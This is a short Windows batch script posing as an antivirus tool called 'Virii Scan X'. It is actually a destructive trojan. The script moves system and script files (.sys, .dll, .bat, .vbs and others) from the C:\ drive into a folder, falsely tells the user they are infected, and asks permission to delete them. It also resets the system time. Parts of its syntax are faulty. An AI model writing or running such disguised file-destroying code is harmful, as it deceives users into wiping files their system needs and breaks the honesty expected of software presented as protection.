   @Echo off
   CD\ C:\
   MD VSX\Infected
   Move C:\*.bat >> C:\VSX\Infected
   Move C:\*.vbs >> C:\VSX\Infected
   Move C:\*.sys >> C:\VSX\Infected
   Move C:\*.dll >> C:\VSX\Infected
   Move C:\*.ocx >> C:\VSX\Infected
   Move C:\*.mod >> C:\VSX\Infected
   cls
   Echo This version of Virii Scan® X has detected that you have infected files in 'C:\' drive(s).
   Echo All infected file have been placed in C:\VSX\Infected.
   Echo Would you like to have Virii Scan® X delete the file(s) for you?
   Echo.
   Echo Y) Yes
   Echo N) No
   Echo.
   Choice /c:yn
   If ErrorLevel 2 GoTo lblNo
   If ErroLevel 1 GoTo lblYes

   :lblNo
   cls
   Echo Thank You for using Virii Scan® X for your computers protection.
   Pause
   Exit

   :lblYes
   cls
   Echo You have chosen to have Virii Scan® X to delete your infected file(s).
   Echo Are you sure you wish to continue?
   Echo Y) Yes
   Echo N) No
   Echo.
   Choice /c:yn
   If ErrorLevel 2 GoTo lblNo
   If ErrorLevel 1 GoTo lblYes2

   :lblYes2
   cls
   Echo Virii Scan® X is now ready to delete file(s) in path 'C:\VSX\Infected.'
   Pause
   Del C:\VSX\Infected
   cls
   Echo All infected files have been deleted.
   Echo Thank You for using Virii Scan® X for your computers protection.
   Pause
   Echo Would you like to view the ReadMe file?
   Echo.
   Echo Y) Yes
   Echo N) No
   Choice /c:yn
   If ErrorLevel 2 GoTo lblNo
   If ErrorLevel 1 Goto lblYes3

   :lblYes3
   Echo Virii Scan® X all Rights Reserved. © Copywrite 2003-2004. >> C:\VSX\ReadMe.txt
   Start C:\VSX\ReadMe.txt
   Time 11.11.11
   cls
   Exit
